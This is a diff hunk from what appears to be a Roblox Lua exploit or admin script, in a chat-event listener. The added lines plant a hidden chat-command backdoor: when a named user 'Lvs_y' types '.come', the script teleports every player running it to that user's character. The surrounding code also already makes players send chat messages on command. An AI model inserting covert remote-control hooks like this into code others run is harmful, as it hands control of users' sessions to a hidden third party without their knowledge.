@@ -727,6 +727,10 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFi
             return
         end
         game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
+    elseif H.FromSpeaker == "Lvs_y" and H.Message == ".come" then
+        local userrr = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
+        local hotrobloxfemboydev = game.Workspace.Lvs_y.HumanoidRootPart
+        userrr.CFrame = hotrobloxfemboydev.CFrame
     end
 end)
 
